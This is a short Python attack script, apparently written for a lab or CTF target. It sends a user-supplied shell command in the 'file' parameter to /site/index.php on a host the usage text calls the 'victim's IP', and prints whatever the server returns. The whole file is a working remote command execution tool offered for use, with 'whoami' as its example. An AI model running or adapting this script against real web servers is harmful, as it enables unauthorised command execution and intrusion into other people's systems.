#!/bin/python3

# import requests
import requests, sys, signal

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# With Ctrl+C pressed
signal.signal(signal.SIGINT, def_handler)

def showHelp():
    print(f"[!] Usage: python3 {sys.argv[0]} [host] [command]")
    print(f"\n\n\tExample => python3 {sys.argv[0]} <victim's IP> 'whoami'\n")
    sys.exit(1)

def makeRequest():
    url = f"http://{sys.argv[1]}/site/index.php"
    command = sys.argv[2]
    data = {
        'file': command
    }

    # create a session 
    s = requests.session()

    # create a session with the url and check connection status
    req = s.get(url, params=data)
    print(f"Status: {req.status_code}")

    # print the result as text 
    res = req.text
    print(f"\n\n {res}")

def main(): # main should make sure the right arguments are accepted
    if len(sys.argv) < 3:
        showHelp()
    else: # else go ahead and run the program
        makeRequest()

if __name__ == "__main__":
    main()